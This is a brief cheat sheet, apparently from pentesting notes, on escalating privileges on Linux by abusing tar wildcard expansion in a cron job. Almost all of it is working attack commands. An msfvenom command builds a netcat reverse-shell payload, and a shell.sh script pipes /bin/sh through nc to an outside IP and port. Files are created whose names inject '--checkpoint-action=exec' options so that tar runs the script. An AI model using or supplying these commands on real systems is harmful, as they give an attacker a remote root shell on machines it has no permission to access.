---
title: Cheatsheet - TAR + Wildcard
categories: [Cheatsheet, Linux Privilege Escalation]
tags: [linux-priv-esc/cronjob, cheatsheet/linux]
---


# Wildcard + Tar exploit
```
msfvenom -p cmd/unix/reverse_netcat lhost=10.13.28.250 lport=8888 R
```
```
cd /var/www/html

echo "mkfifo /tmp/lhennp; nc 10.13.28.250 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh

echo "" > "--checkpoint-action=exec=sh shell.sh"

echo "" > --checkpoint=1
```
